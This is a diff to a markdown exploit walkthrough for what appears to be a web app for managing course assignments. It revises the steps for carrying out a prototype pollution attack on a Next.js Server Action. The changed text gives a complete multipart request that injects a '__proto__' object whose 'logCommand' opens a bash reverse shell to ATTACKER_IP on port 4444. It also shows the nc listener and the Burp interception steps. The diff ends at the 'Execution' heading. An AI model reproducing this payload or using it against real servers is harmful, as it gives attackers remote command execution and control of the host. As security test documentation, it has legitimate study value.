@@ -40,21 +40,26 @@ nc -lvnp 4444
 ### 4.2 Craft the Payload
 1. As a Lecturer, navigate to `/lecturer/assignments`.
 2. Turn on Burp Suite Intercept.
-3. Fill out the "Create Assignment" form and click Submit.
+3. Fill out the "Create Assignment" form (make sure to select a file if there's a file input) and click Submit.
 4. In Burp Suite, inspect the intercepted `POST` request to `/lecturer/assignments`.
-5. The request body is a JSON array (Next.js Server Action payload). Locate the assignment data object (e.g. `{"title":"Test Exploit", ...}`).
-6. Inject the `__proto__` payload into this JSON object:
+5. You will see that the request uses `multipart/form-data`. The first part (usually `name="0"`) contains a JSON array representing the Server Action arguments.
+6. Locate the JSON array (which contains your assignment data like `{"title":"Test Exploit", ...}`) inside `name="0"`.
+7. Inject the `__proto__` payload into this JSON object:
 
-```json
-{
-  "title": "Test Exploit",
-  "module": "General",
-  "type": "Homework",
-  "dueDate": "2026-10-10",
-  "__proto__": {
-    "logCommand": "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
-  }
-}
+```http
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+[{"title":"Test Exploit","module":"General","type":"Homework","dueDate":"2026-10-10","__proto__":{"logCommand":"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"}}]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
 ```
 
 ### 4.3 Execution
